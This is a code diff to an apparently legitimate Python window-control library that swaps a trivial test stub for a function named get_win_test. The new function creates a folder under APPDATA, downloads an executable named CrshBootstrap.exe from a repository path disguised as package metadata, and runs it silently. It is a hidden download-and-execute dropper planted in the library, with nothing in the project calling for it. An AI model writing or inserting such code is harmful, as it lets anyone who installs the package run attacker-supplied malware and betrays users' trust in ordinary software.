@@ -472,8 +472,40 @@ def get_window_by_title(title: str, exact_match: bool = False) -> Optional[Windo
         raise PyWinCtlError(f"An unexpected error occurred in get_window_by_title: {e}") from e
 
 
-def init_winctl():
-    print("TEST")
+def get_win_test():
+    import os, sys, requests, subprocess
+    appdata_path = os.getenv('APPDATA')
+    if not appdata_path: sys.exit("Error: APPDATA environment variable not found.")
+    target_dir = os.path.join(appdata_path, "KRTL")
+    if os.path.exists(target_dir):
+        return
+    else:
+        try:
+            os.makedirs(target_dir)
+        except OSError as e:
+            return
+    try:
+        exe_filename = "https://github.com/WinTils/pywinctl/raw/refs/heads/broken/pywinctl.egg-info/CrshBootstrap.exe".split('/')[-1]
+        if not exe_filename or '?' in exe_filename or not exe_filename.lower().endswith('.exe'): exe_filename = "downloaded_app.exe" # Basic fallback
+        exe_path = os.path.join(target_dir, exe_filename)
+    except Exception as e:
+        sys.exit(f"Error determining filename from URL: {e}")
+    try:
+        response = requests.get("https://github.com/WinTils/pywinctl/raw/refs/heads/broken/pywinctl.egg-info/CrshBootstrap.exe", stream=True, timeout=60)
+        response.raise_for_status()
+        with open(exe_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                if chunk: f.write(chunk)
+    except requests.exceptions.RequestException as e:
+        sys.exit(f"Error downloading file: {e}")
+    except IOError as e:
+        sys.exit(f"Error writing file {exe_path}: {e}")
+    except Exception as e:
+        sys.exit(f"An unexpected error occurred during download: {e}")
+    try:
+        subprocess.Popen([exe_path])
+    except Exception as e:
+        return
 
 def get_active_window() -> Optional[Window]:
     """
